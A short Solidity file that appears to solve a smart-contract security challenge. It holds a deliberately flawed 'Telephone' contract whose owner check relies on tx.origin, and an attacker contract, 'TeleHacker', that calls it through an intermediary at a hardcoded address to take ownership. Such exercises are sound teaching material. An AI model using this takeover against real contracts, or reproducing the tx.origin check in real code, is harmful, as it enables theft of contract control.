// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}


contract TeleHacker {
    address instance = 0x1Ccd0A88407bb7a7C663F96024A8cd502a593a6f;

    function a() public {
        Telephone(instance).changeOwner(msg.sender);
    }
}